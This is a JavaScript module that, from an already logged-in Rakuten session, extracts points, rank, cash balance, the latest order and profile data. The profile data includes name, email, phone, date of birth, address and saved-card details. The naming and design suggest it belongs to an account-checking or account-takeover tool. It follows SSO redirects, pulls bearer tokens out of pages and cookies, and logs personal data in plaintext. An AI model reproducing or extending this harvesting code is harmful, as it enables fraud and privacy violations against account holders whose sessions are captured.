/**
 * =============================================================================
 * HTTP DATA CAPTURE - API-BASED ACCOUNT DATA EXTRACTION
 * =============================================================================
 * 
 * Extracts account data (points, membership rank, Rakuten Cash) from API.
 * Uses ichiba-common-web-gateway API for direct data retrieval.
 * 
 * =============================================================================
 */

const cheerio = require('cheerio');
const { createLogger } = require('../../logger');
const { getCookieString } = require('./httpClient');

const log = createLogger('http-capture');

// API endpoint for account data
const HEADER_INFO_API = 'https://ichiba-common-web-gateway.rakuten.co.jp/ichiba-common/headerinfo/get/v1';

// Target URL for data extraction
const TARGET_HOME_URL = 'https://www.rakuten.co.jp/';

// Order history URL
const ORDER_HISTORY_URL = 'https://order.my.rakuten.co.jp/purchase-history/order-list?l-id=pc_header_func_ph';

// Profile API URLs
const PROFILE_GATEWAY_START = 'https://profile.id.rakuten.co.jp/gateway/start?clientId=jpn&state=/';
const PROFILE_SUMMARY_API = 'https://profile.id.rakuten.co.jp/v2/member/summary/';
const PROFILE_ADDRESS_API = 'https://profile.id.rakuten.co.jp/v2/member/address';
const PROFILE_CARD_API = 'https://profile.id.rakuten.co.jp/v2/member/card';

// Membership rank number to string mapping (1=lowest, 5=highest)
const RANK_MAP = {
  1: 'Regular',
  2: 'Silver',
  3: 'Gold',
  4: 'Platinum',
  5: 'Diamond',
};

/**
 * Captures account data from authenticated session using API.
 * HTTP equivalent of dataCapture.captureAccountData()
 * 
 * @param {Object} session - Authenticated HTTP session
 * @param {Object} [options] - Capture options
 * @param {number} [options.timeoutMs=30000] - Request timeout
 * @returns {Promise<Object>} Account data (points, rank, cash)
 */
async function captureAccountData(session, options = {}) {
  const { timeoutMs = 30000 } = options;
  const { client, jar } = session;
  
  log.debug('Fetching account data');
  
  try {
    // Try API-based capture directly (we already have session cookies from login)
    let result = await captureViaApi(client, jar, timeoutMs);
    if (!result) {
      // Fallback to HTML scraping if API fails
      log.warn('API capture failed, falling back to HTML scraping...');
      result = await captureViaHtml(client, jar, timeoutMs);
    } else {
      log.info(`API capture - points: ${result.points}, rank: ${result.rank}, cash: ${result.cash}`);
    }
    
    // Fetch latest order info
    const orderInfo = await fetchLatestOrder(client, jar, timeoutMs);
    if (orderInfo) {
      result.latestOrder = orderInfo.date || 'n/a';
      result.latestOrderId = orderInfo.orderId || 'n/a';
    } else {
      result.latestOrder = 'n/a';
      result.latestOrderId = 'n/a';
    }
    
    log.info(`Latest order: ${result.latestOrder} (ID: ${result.latestOrderId})`);
    
    // Fetch profile data (name, email, phone, DOB, address)
    const profileData = await fetchProfileData(client, jar, timeoutMs);
    if (profileData) {
      result.profile = profileData;
      log.info(`Profile: ${profileData.name}, ${profileData.email}, DOB: ${profileData.dob}`);
    } else {
      result.profile = null;
    }
    
    return result;
  } catch (error) {
    log.error('Data capture failed:', error.message);
    throw new Error(`Failed to capture account data: ${error.message}`);
  }
}

// Static authkey for ichiba API (appears to be constant)
const HEADER_INFO_AUTHKEY = 'hin9ruj3haAPxBP0nBQBlaga6haUCobPR';

/**
 * Captures account data via ichiba-common API.
 * @param {Object} client - HTTP client
 * @param {Object} jar - Cookie jar
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object|null>} Account data or null on failure
 */
async function captureViaApi(client, jar, timeoutMs) {
  try {
    // Get cookies for the API request
    const cookieString = await getCookieString(jar, 'https://www.rakuten.co.jp/');
    
    // Request body - only request memberPointInfo
    const requestBody = {
      common: {
        params: { source: 'pc' },
        exclude: [null]
      },
      features: {
        memberPointInfo: {
          exclude: [null]
        }
      }
    };
    
    log.debug(`API request with cookies: ${cookieString.substring(0, 50)}...`);
    
    const response = await client.post(HEADER_INFO_API, requestBody, {
      timeout: timeoutMs,
      headers: {
        'Accept': '*/*',
        'Content-Type': 'application/json',
        'authkey': HEADER_INFO_AUTHKEY,
        'Origin': 'https://www.rakuten.co.jp',
        'Referer': 'https://www.rakuten.co.jp/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Cookie': cookieString,
      },
    });
    
    log.debug(`API response status: ${response.status}`);
    
    if (response.status !== 200 && response.status !== 207) {
      log.warn(`API returned status ${response.status}`);
      return null;
    }
    
    const data = response.data;
    log.debug('API response:', JSON.stringify(data).substring(0, 500));
    
    // Parse the response structure
    const memberPointInfo = data?.body?.memberPointInfo?.data;
    if (!memberPointInfo) {
      log.warn('No memberPointInfo in API response');
      return null;
    }
    
    const pointInfo = memberPointInfo.pointInfo || {};
    const pointInvestInfo = memberPointInfo.pointInvestInfo || {};
    
    // Extract values - use holdingPoint as primary, fallback to fixedStdPoint
    const points = pointInvestInfo.holdingPoint ?? pointInfo.fixedStdPoint ?? 'n/a';
    const cash = pointInfo.rcashPoint ?? 'n/a';
    const rankNum = pointInfo.rank;
    const rank = RANK_MAP[rankNum] || (rankNum ? `Rank ${rankNum}` : 'n/a');
    
    return {
      points: String(points),
      cash: String(cash),
      rank,
      url: TARGET_HOME_URL,
      rawData: {
        fixedStdPoint: pointInfo.fixedStdPoint,
        unfixedStdPoint: pointInfo.unfixedStdPoint,
        rcashPoint: pointInfo.rcashPoint,
        rank: rankNum,
        holdingPoint: pointInvestInfo.holdingPoint,
      },
    };
  } catch (error) {
    log.warn('API capture error:', error.message);
    return null;
  }
}

/**
 * Captures account data via HTML scraping (fallback).
 * @param {Object} client - HTTP client
 * @param {Object} jar - Cookie jar  
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object>} Account data
 */
async function captureViaHtml(client, jar, timeoutMs) {
  // Navigate to Rakuten home page
  const homeResponse = await client.get(TARGET_HOME_URL, {
    timeout: timeoutMs,
    headers: {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
    },
  });
  
  // Parse HTML
  const $ = cheerio.load(homeResponse.data);
  
  // Extract points from home page
  const pointsText = extractPoints($, homeResponse.data) || 'n/a';
  
  log.info(`HTML capture - points: ${pointsText}`);
  
  return {
    points: pointsText,
    cash: 'n/a',
    rank: 'n/a',
    url: TARGET_HOME_URL,
  };
}

/**
 * Fetches the latest order info from purchase history.
 * Handles SSO flow: order.my.rakuten.co.jp → login.account.rakuten.com → sessionAlign → redirect back
 * @param {Object} client - HTTP client
 * @param {Object} jar - Cookie jar
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object|null>} { date, orderId } or null if no orders
 */
async function fetchLatestOrder(client, jar, timeoutMs) {
  try {
    log.debug('Fetching order history with SSO flow...');
    
    // Step 1: Initial request to order history - will redirect to SSO authorize
    let response = await client.get(ORDER_HISTORY_URL, {
      timeout: timeoutMs,
      maxRedirects: 10,
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
      },
    });
    
    let html = response.data;
    let currentUrl = response.request?.res?.responseUrl || response.config?.url || '';
    log.debug(`Step 1 - URL: ${currentUrl.substring(0, 80)}...`);
    
    // Step 2: If we got SSO authorize page with auto-submit form, handle it manually
    // The page contains: <form id="post_form" action="..." method="POST">...<input name="..." value="...">
    if (html.includes('post_form') || html.includes('login.account.rakuten.com')) {
      log.debug('Got SSO authorize page, parsing auto-submit form...');
      
      // Parse form action and inputs
      const formActionMatch = html.match(/<form[^>]*id=["']?post_form["']?[^>]*action=["']([^"']+)["']/i) ||
                              html.match(/<form[^>]*action=["']([^"']+)["'][^>]*id=["']?post_form["']?/i);
      
      if (formActionMatch) {
        const formAction = formActionMatch[1].replace(/&amp;/g, '&');
        log.debug(`Form action: ${formAction.substring(0, 80)}...`);
        
        // Extract all hidden inputs
        const formData = {};
        const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["'][^>]*>/gi;
        const inputRegex2 = /<input[^>]*value=["']([^"']*)["'][^>]*name=["']([^"']+)["'][^>]*>/gi;
        
        let match;
        while ((match = inputRegex.exec(html)) !== null) {
          formData[match[1]] = match[2];
        }
        while ((match = inputRegex2.exec(html)) !== null) {
          formData[match[2]] = match[1];
        }
        
        log.debug(`Form fields: ${Object.keys(formData).join(', ')}`);
        
        // Submit the form (this goes to sessionAlign)
        if (Object.keys(formData).length > 0) {
          response = await client.post(formAction, new URLSearchParams(formData).toString(), {
            timeout: timeoutMs,
            maxRedirects: 10,
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
              'Origin': 'https://login.account.rakuten.com',
              'Referer': currentUrl,
            },
          });
          
          html = response.data;
          currentUrl = response.request?.res?.responseUrl || response.config?.url || '';
          log.debug(`Step 2 (form submit) - URL: ${currentUrl.substring(0, 80)}...`);
          
          // Step 3: Check if we need to handle another form (redirect back to order history)
          if (html.includes('post_form') || html.includes('purchasehistoryapi/redirect')) {
            const formActionMatch2 = html.match(/<form[^>]*action=["']([^"']+)["']/i);
            if (formActionMatch2) {
              const formAction2 = formActionMatch2[1].replace(/&amp;/g, '&');
              log.debug(`Second form action: ${formAction2.substring(0, 80)}...`);
              
              const formData2 = {};
              const inputRegex3 = /<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["'][^>]*>/gi;
              while ((match = inputRegex3.exec(html)) !== null) {
                formData2[match[1]] = match[2];
              }
              
              if (Object.keys(formData2).length > 0) {
                response = await client.post(formAction2, new URLSearchParams(formData2).toString(), {
                  timeout: timeoutMs,
                  maxRedirects: 10,
                  headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                  },
                });
                
                html = response.data;
                currentUrl = response.request?.res?.responseUrl || response.config?.url || '';
                log.debug(`Step 3 (second form) - URL: ${currentUrl.substring(0, 80)}...`);
              }
            }
          }
        }
      }
    }
    
    // Final check
    log.debug(`Final response length: ${html.length}`);
    
    if (response.status !== 200) {
      log.warn(`Order history returned status ${response.status}`);
      return null;
    }
    
    // Check if we got the order page
    const hasOrderDate = html.includes('注文日');
    const hasOrderNum = html.includes('注文番号');
    log.debug(`Order page check - 注文日: ${hasOrderDate}, 注文番号: ${hasOrderNum}`);
    
    if (!hasOrderDate && !hasOrderNum) {
      const preview = html.substring(0, 500).replace(/\s+/g, ' ');
      log.debug(`Response preview: ${preview}`);
    }
    
    let latestOrderDate = null;
    let latestOrderId = null;
    
    // Extract order date using regex on raw HTML
    // HTML structure: <span>注文日\n<!-- -->\n：</span>\n<span...>2025/12/04(木)</span>
    // The colon ： is full-width Japanese colon (U+FF1A)
    const datePattern = /注文日[\s\S]*?[：:]<\/span>[\s\S]*?<span[^>]*>(\d{4}\/\d{2}\/\d{2})/;
    const dateMatch = html.match(datePattern);
    if (dateMatch) {
      latestOrderDate = dateMatch[1];
      log.debug(`Date pattern matched: ${latestOrderDate}`);
    } else {
      log.debug('Date pattern did NOT match');
      // Debug: Find and log the area around 注文日
      const idx = html.indexOf('注文日');
      if (idx !== -1) {
        log.debug(`Found 注文日 at index ${idx}, snippet: ${html.substring(idx, idx + 200).replace(/\n/g, '\\n')}`);
      }
    }
    
    // Extract order number using regex
    // HTML structure: <span>注文番号\n<!-- -->\n：</span>\n<span...>263885-20251204-0284242812</span>
    const orderPattern = /注文番号[\s\S]*?[：:]<\/span>[\s\S]*?<span[^>]*>(\d+-\d+-(\d+))<\/span>/;
    const orderMatch = html.match(orderPattern);
    if (orderMatch) {
      latestOrderId = orderMatch[2]; // Get just the order ID part (e.g., 0284242812)
      log.debug(`Order pattern matched: ${orderMatch[1]} -> ID: ${latestOrderId}`);
    } else {
      log.debug('Order pattern did NOT match');
    }
    
    if (latestOrderDate || latestOrderId) {
      log.info(`Latest order - date: ${latestOrderDate}, orderId: ${latestOrderId}`);
      return { date: latestOrderDate, orderId: latestOrderId };
    }
    
    log.info('No orders found in purchase history');
    return null;
  } catch (error) {
    log.warn('Failed to fetch order history:', error.message);
    return null;
  }
}

/**
 * Fetches profile data (name, email, phone, DOB, address) from profile.id.rakuten.co.jp
 * Handles SSO gateway flow to obtain Bearer token for API access.
 * Flow: gateway/start → SSO authorize → callback with code → exchangeToken → token → API calls
 * @param {Object} client - HTTP client
 * @param {Object} jar - Cookie jar
 * @param {number} timeoutMs - Request timeout
 * @returns {Promise<Object|null>} { name, email, phone, dob, address } or null on failure
 */
async function fetchProfileData(client, jar, timeoutMs) {
  try {
    log.debug('Fetching profile data via gateway flow...');
    
    // Step 1: Go directly to SSO authorize for profile (this is what gateway/start redirects to via JS)
    const ssoAuthorizeUrl = 'https://login.account.rakuten.com/sso/authorize?client_id=rakuten_myr_jp_web&scope=openid&response_type=code&max_age=3600&redirect_uri=https%3A%2F%2Fprofile.id.rakuten.co.jp%2Fgateway%2Fcallback&state=%2F';
    
    let response = await client.get(ssoAuthorizeUrl, {
      timeout: timeoutMs,
      maxRedirects: 10,
      headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
      },
    });
    
    let html = response.data;
    let currentUrl = response.request?.res?.responseUrl || response.config?.url || '';
    log.debug(`Profile SSO Step 1 - URL: ${currentUrl.substring(0, 80)}...`);
    
    // Step 2: Handle SSO form redirects (same pattern as order history)
    let maxIterations = 5;
    while (maxIterations-- > 0 && (html.includes('post_form') || html.includes('sessionAlign'))) {
      const formActionMatch = html.match(/<form[^>]*action=["']([^"']+)["'][^>]*/i);
      if (!formActionMatch) break;
      
      const formAction = formActionMatch[1].replace(/&amp;/g, '&');
      log.debug(`Profile SSO form action: ${formAction.substring(0, 60)}...`);
      
      // Extract hidden inputs
      const formData = {};
      const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["'][^>]*>/gi;
      let match;
      while ((match = inputRegex.exec(html)) !== null) {
        formData[match[1]] = match[2];
      }
      // Also match value before name
      const inputRegex2 = /<input[^>]*value=["']([^"']*)["'][^>]*name=["']([^"']+)["'][^>]*>/gi;
      while ((match = inputRegex2.exec(html)) !== null) {
        formData[match[2]] = match[1];
      }
      
      if (Object.keys(formData).length === 0) break;
      
      log.debug(`Profile SSO form fields: ${Object.keys(formData).join(', ')}`);
      
      response = await client.post(formAction, new URLSearchParams(formData).toString(), {
        timeout: timeoutMs,
        maxRedirects: 10,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Referer': currentUrl,
        },
      });
      
      html = response.data;
      currentUrl = response.request?.res?.responseUrl || response.config?.url || '';
      log.debug(`Profile SSO form submit - URL: ${currentUrl.substring(0, 80)}...`);
    }
    
    // Step 3: We should now be at /gateway/callback with a code, or on an exchange page
    // Try to extract the code or exchange_token from URL
    let bearerToken = null;
    
    // Check if we got callback with code
    const codeMatch = currentUrl.match(/[?&]code=([^&]+)/);
    if (codeMatch) {
      log.debug('Got callback with authorization code, following exchange flow...');
      // The callback page should have JS that calls exchangeToken, but we can call it directly
      const code = codeMatch[1];
      const stateMatch = currentUrl.match(/[?&]state=([^&]*)/);
      const state = stateMatch ? decodeURIComponent(stateMatch[1]) : '/';
      
      // Call the callback endpoint which handles the token exchange
      const callbackUrl = `https://profile.id.rakuten.co.jp/gateway/callback?state=${encodeURIComponent(state)}&code=${code}&clientId=jpn`;
      
      const callbackResponse = await client.get(callbackUrl, {
        timeout: timeoutMs,
        maxRedirects: 5,
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      });
      
      html = callbackResponse.data;
      currentUrl = callbackResponse.request?.res?.responseUrl || callbackResponse.config?.url || '';
      log.debug(`Profile callback - URL: ${currentUrl.substring(0, 80)}...`);
    }
    
    // Look for exchange_token in URL or page content
    const exchangeMatch = currentUrl.match(/exchange_token=([^&]+)/) || 
                         html.match(/exchange_token[=:][\s"']*([^&"'\s]+)/);
    
    if (exchangeMatch) {
      const exchangeToken = decodeURIComponent(exchangeMatch[1]);
      log.debug(`Found exchange token: ${exchangeToken.substring(0, 50)}...`);
      
      // The exchange token contains the access token embedded in base64-encoded MessagePack data
      // Try to find @St. pattern directly in the exchange token (unlikely since it's base64 encoded)
      // Token format: @St..<base64part>.<base64part> - can be 200+ chars
      const tokenPatternInExchange = /@St\.[A-Za-z0-9._-]{50,}/;
      const tokenInExchangeMatch = exchangeToken.match(tokenPatternInExchange);
      if (tokenInExchangeMatch) {
        bearerToken = tokenInExchangeMatch[0];
        log.debug(`Found Bearer token embedded in exchange token: ${bearerToken.substring(0, 50)}...`);
        log.debug(`Token length: ${bearerToken.length}`);
      }
      
      // Also try to decode base64 segments that might contain the token
      // NOTE: The exchange_token contains an embedded session token (@St..xxx ~266 chars)
      // but this is NOT the Bearer token needed for API calls. The proper Bearer token
      // (~5000+ chars) is obtained from /gateway/initiate after the session is established.
      // We skip extracting the embedded token here.
      
      // Call exchangeToken endpoint
      const exchangeUrl = `https://profile.id.rakuten.co.jp/gateway/callback/exchangeToken?exchange_token=${encodeURIComponent(exchangeToken)}&clientId=jpn&last_visited_path=/`;
      
      const exchangeResponse = await client.get(exchangeUrl, {
        timeout: timeoutMs,
        maxRedirects: 5,
        headers: { 'Accept': 'text/html,*/*' },
      });
      
      html = exchangeResponse.data;
      currentUrl = exchangeResponse.request?.res?.responseUrl || exchangeResponse.config?.url || '';
      log.debug(`Profile exchange - URL: ${currentUrl.substring(0, 80)}...`);
      
      // The exchange endpoint should set the Im cookie which contains the session token
      // Check cookies after exchange
      const cookiesAfterExchange = await getCookieString(jar, 'https://profile.id.rakuten.co.jp/');
      log.debug(`Cookies after exchange: ${cookiesAfterExchange.substring(0, 200)}...`);
      
      // Look for Im cookie which may contain the session
      const imCookieMatch = cookiesAfterExchange.match(/Im=([^;]+)/);
      if (imCookieMatch) {
        log.debug(`Found Im cookie: ${imCookieMatch[1].substring(0, 60)}...`);
      }
      
      // Now call the token endpoint - this returns JSON with access_token
      const tokenUrl = `https://profile.id.rakuten.co.jp/gateway/callback/token?exchange_token=${encodeURIComponent(exchangeToken)}&last_visited_path=/&clientId=jpn`;
      
      const tokenResponse = await client.get(tokenUrl, {
        timeout: timeoutMs,
        maxRedirects: 5,
        headers: { 'Accept': 'application/json, text/html, */*' },
      });
      
      currentUrl = tokenResponse.request?.res?.responseUrl || tokenResponse.config?.url || '';
      log.debug(`Profile token endpoint - URL: ${currentUrl.substring(0, 80)}...`);
      log.debug(`Profile token response type: ${typeof tokenResponse.data}`);
      
      // Check if response is JSON with access_token
      const tokenData = tokenResponse.data;
      if (typeof tokenData === 'object') {
        log.debug(`Token response keys: ${Object.keys(tokenData).join(', ')}`);
      } else if (typeof tokenData === 'string') {
        log.debug(`Token response preview: ${tokenData.substring(0, 300).replace(/\s+/g, ' ')}`);
      }
      if (typeof tokenData === 'object' && tokenData.access_token) {
        bearerToken = tokenData.access_token;
        log.debug(`Found Bearer token from JSON response: ${bearerToken.substring(0, 50)}...`);
      } else if (typeof tokenData === 'string') {
        // Try to parse as JSON
        try {
          const parsed = JSON.parse(tokenData);
          if (parsed.access_token) {
            bearerToken = parsed.access_token;
            log.debug(`Found Bearer token from parsed JSON: ${bearerToken.substring(0, 50)}...`);
          }
        } catch (e) {
          // Not JSON, search in HTML
          html = tokenData;
          log.debug(`Token response is HTML, length: ${html.length}`);
        }
      }
    }
    
    // Try to extract Bearer token from HTML/JS or cookies if not found yet
    if (!bearerToken && html) {
      const tokenPatterns = [
        /Bearer\s+(@St\.[A-Za-z0-9_.-]+)/,
        /"access_token"\s*:\s*"(@St\.[^"]+)"/,
        /"token"\s*:\s*"(@St\.[^"]+)"/,
        /authorization["']?\s*:\s*["']?Bearer\s+(@St\.[^"'\s]+)/,
        /"accessToken"\s*:\s*"(@St\.[^"]+)"/,
        // Also look for @St. patterns directly in HTML (may be in data attributes or hidden inputs)
        /data-token=["'](@St\.[^"']+)["']/,
        /value=["'](@St\.[^"']+)["']/,
        // Look for window.__TOKEN__ or similar patterns
        /(?:window\.__TOKEN__|TOKEN|accessToken)\s*=\s*["'](@St\.[^"']+)["']/,
      ];
      
      for (const pattern of tokenPatterns) {
        const tokenMatch = html.match(pattern);
        if (tokenMatch) {
          bearerToken = tokenMatch[1];
          log.debug(`Found Bearer token in HTML: ${bearerToken.substring(0, 50)}...`);
          break;
        }
      }
      
      // Also check for @St. patterns anywhere in the HTML (might be in inline scripts)
      // Token format: @St..<base64part>.<base64part> - can be 200+ chars
      if (!bearerToken) {
        const directMatch = html.match(/@St\.[A-Za-z0-9._-]{50,}/);
        if (directMatch) {
          bearerToken = directMatch[0];
          log.debug(`Found @St. pattern directly in HTML: ${bearerToken.substring(0, 50)}...`);
          log.debug(`Token length: ${bearerToken.length}`);
        }
      }
    }
    
    // Also check cookies for token
    if (!bearerToken) {
      const profileCookies = await getCookieString(jar, 'https://profile.id.rakuten.co.jp/');
      log.debug(`Profile cookies: ${profileCookies.substring(0, 100)}...`);
      const cookieTokenMatch = profileCookies.match(/(?:^|;\s*)(?:access_token|token)=(@St\.[^;]+)/);
      if (cookieTokenMatch) {
        bearerToken = cookieTokenMatch[1];
        log.debug(`Found Bearer token in cookie: ${bearerToken.substring(0, 50)}...`);
      }
    }
    
    // Check if we already found a proper Bearer token (long token with @St.default. prefix)
    // The session token from exchange_token is ~266 chars, the real Bearer token is ~5000+ chars
    if (bearerToken && bearerToken.length > 1000 && bearerToken.startsWith('@St.default.')) {
      log.debug(`Already have valid Bearer token from token endpoint (${bearerToken.length} chars), skipping initiate`);
    } else {
      // Clear any short session token - we need the proper one from initiate
      if (bearerToken) {
        log.debug(`Clearing short/invalid token (${bearerToken.length} chars), calling initiate...`);
      }
      bearerToken = null;
      log.debug('Calling gateway/initiate to get proper Bearer token (session is established via Im cookie)...');
    const initiateUrl = 'https://profile.id.rakuten.co.jp/gateway/initiate?clientId=jpn&last_visited_path=/';
    const initiateResponse = await client.get(initiateUrl, {
      timeout: timeoutMs,
      maxRedirects: 5,
      headers: { 
        'Accept': 'application/json, text/html, */*',
        'Referer': 'https://profile.id.rakuten.co.jp/',
      },
    });
    
    log.debug(`Initiate response status: ${initiateResponse.status}, type: ${typeof initiateResponse.data}`);
    
    // Check if initiate returns JSON with access_token
    const initiateData = initiateResponse.data;
    if (typeof initiateData === 'object' && initiateData.access_token) {
      bearerToken = initiateData.access_token;
      log.debug(`Found Bearer token from initiate JSON: ${bearerToken.substring(0, 60)}... (${bearerToken.length} chars)`);
    } else if (typeof initiateData === 'string') {
      log.debug(`Initiate response preview: ${initiateData.substring(0, 300).replace(/\s+/g, ' ')}`);
      // Try to find access_token in HTML/JS
      const tokenPatterns = [
        /"access_token"\s*:\s*"(@St\.[^"]+)"/,
        /"accessToken"\s*:\s*"(@St\.[^"]+)"/,
        /accessToken=(@St\.[^&"'\s]+)/,
      ];
      for (const pattern of tokenPatterns) {
        const tokenMatch = initiateData.match(pattern);
        if (tokenMatch) {
          bearerToken = tokenMatch[1];
          log.debug(`Found Bearer token from initiate HTML: ${bearerToken.substring(0, 60)}... (${bearerToken.length} chars)`);
          break;
        }
      }
    }
    
      if (!bearerToken) {
        log.warn('Could not obtain Bearer token from gateway/initiate');
        return null;
      }
    }
    
    // Now call the APIs with Bearer token
    // Add required headers from sample request
    const headers = {
      'Accept': '*/*',
      'Accept-Language': 'ja',
      'Authorization': `Bearer ${bearerToken}`,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'Referer': 'https://profile.id.rakuten.co.jp/',
      // These UUIDs appear to be static values from the sample request
      'serviceuuid': 'c2ccb1a9-daea-4505-89ae-6bad6c9af5f2',
      'x-client-id': 'f2ce0768-717c-4f33-be14-9149f5b9ad30',
    };
    
    log.debug(`Using Bearer token: ${bearerToken.substring(0, 60)}... (${bearerToken.length} chars)`);
    
    // Fetch summary
    let summary = null;
    try {
      const summaryResponse = await client.get(PROFILE_SUMMARY_API, {
        timeout: timeoutMs,
        headers,
      });
      
      log.debug(`Summary API status: ${summaryResponse.status}`);
      if (summaryResponse.status === 200 && summaryResponse.data) {
        summary = summaryResponse.data;
        log.debug(`Summary API response: ${JSON.stringify(summary).substring(0, 200)}...`);
      } else if (summaryResponse.status === 401) {
        log.debug(`Summary API 401 - token rejected. Response: ${JSON.stringify(summaryResponse.data).substring(0, 200)}`);
      }
    } catch (err) {
      log.debug(`Summary API error: ${err.message}`);
    }
    
    // Fetch address
    let address = null;
    try {
      const addressResponse = await client.get(PROFILE_ADDRESS_API, {
        timeout: timeoutMs,
        headers,
      });
      
      if (addressResponse.status === 200 && addressResponse.data) {
        address = Array.isArray(addressResponse.data) ? addressResponse.data[0] : addressResponse.data;
        log.debug(`Address API response: ${JSON.stringify(address).substring(0, 200)}...`);
      }
    } catch (err) {
      log.debug(`Address API error: ${err.message}`);
    }
    
    // Fetch cards (can have multiple)
    let cards = null;
    try {
      const cardResponse = await client.get(PROFILE_CARD_API, {
        timeout: timeoutMs,
        headers,
      });
      
      log.debug(`Card API status: ${cardResponse.status}`);
      if (cardResponse.status === 200 && cardResponse.data) {
        // Response is array of cards
        cards = Array.isArray(cardResponse.data) ? cardResponse.data : [cardResponse.data];
        log.debug(`Card API response: ${JSON.stringify(cards).substring(0, 300)}...`);
        log.info(`Found ${cards.length} card(s) on account`);
      }
    } catch (err) {
      log.debug(`Card API error: ${err.message}`);
    }
    
    if (!summary && !address && !cards) {
      log.warn('Profile APIs returned no data despite having token');
      return null;
    }
    
    // Build result with all available phone numbers
    const result = {
      name: summary ? `${summary.lastName || ''} ${summary.firstName || ''}`.trim() : null,
      nameKana: summary ? `${summary.lastNameKana || ''} ${summary.firstNameKana || ''}`.trim() : null,
      nickname: summary?.nickname || null,
      email: summary?.email || summary?.username || null,
      mobilePhone: summary?.mobilePhone || null,
      homePhone: summary?.homePhone || null,
      fax: summary?.fax || null,
      dob: summary?.dob || null,
      gender: summary?.gender || null,
      postalCode: address?.postalCode || null,
      state: address?.state || null,
      city: address?.city || null,
      addressLine1: address?.addressLine1 || null,
      // Cards array - each card has: brandName, ownerName, expireYear, expireMonth, numberLast, isPrimary
      cards: cards ? cards.map(c => ({
        brand: c.brandName || null,
        owner: c.ownerName || null,
        expiry: (c.expireYear && c.expireMonth) ? `${c.expireMonth}/${c.expireYear}` : null,
        last4: c.numberLast || null,
        isPrimary: c.isPrimary || false,
      })) : null,
    };
    
    // Get primary phone for logging (prefer mobile)
    const primaryPhone = result.mobilePhone || result.homePhone || 'n/a';
    const cardCount = result.cards ? result.cards.length : 0;
    log.info(`Profile captured - name: ${result.name} (${result.nameKana}), email: ${result.email}, dob: ${result.dob}, phone: ${primaryPhone}, cards: ${cardCount}`);
    
    return result;
  } catch (error) {
    log.warn('Failed to fetch profile data:', error.message);
    return null;
  }
}

/**
 * Extracts points value from page content.
 * @param {CheerioAPI} $ - Cheerio instance
 * @param {string} html - Raw HTML
 * @returns {string|null} Points value
 */
function extractPoints($, html) {
  // Strategy 1: Look for links with "保有ポイント" (held points) text
  const pointLinks = $('a:contains("保有ポイント")');
  if (pointLinks.length > 0) {
    const text = pointLinks.first().text();
    const match = text.match(/(\d{1,3}(?:,\d{3})*)/);
    if (match) {
      return match[1];
    }
  }
  
  // Strategy 2: Look for any links to point.rakuten with numbers
  const rakutenPointLinks = $('a[href*="point.rakuten"]');
  for (let i = 0; i < rakutenPointLinks.length; i++) {
    const text = $(rakutenPointLinks[i]).text();
    const match = text.match(/(\d{1,3}(?:,\d{3})*)/);
    if (match) {
      const value = parseInt(match[1].replace(/,/g, ''), 10);
      if (value > 100) { // Filter out small numbers (likely not points)
        return match[1];
      }
    }
  }
  
  // Strategy 3: Find largest comma-separated number in page (likely points)
  const allLinks = $('a');
  let largestPoints = null;
  let largestValue = 0;
  
  allLinks.each((i, elem) => {
    const text = $(elem).text();
    const matches = text.match(/(\d{1,3}(?:,\d{3})+)/g);
    if (matches) {
      for (const match of matches) {
        const numericValue = parseInt(match.replace(/,/g, ''), 10);
        if (numericValue > largestValue && numericValue < 999999) {
          largestValue = numericValue;
          largestPoints = match;
        }
      }
    }
  });
  
  if (largestPoints && largestValue > 100) {
    return largestPoints;
  }
  
  // Strategy 4: Regex search in raw HTML
  const pointsPattern = /保有ポイント[^\d]*(\d{1,3}(?:,\d{3})*)/;
  const htmlMatch = html.match(pointsPattern);
  if (htmlMatch) {
    return htmlMatch[1];
  }
  
  return null;
}

module.exports = {
  captureAccountData,
  captureViaApi,
  captureViaHtml,
  fetchLatestOrder,
  fetchProfileData,
  extractPoints,
  RANK_MAP,
};
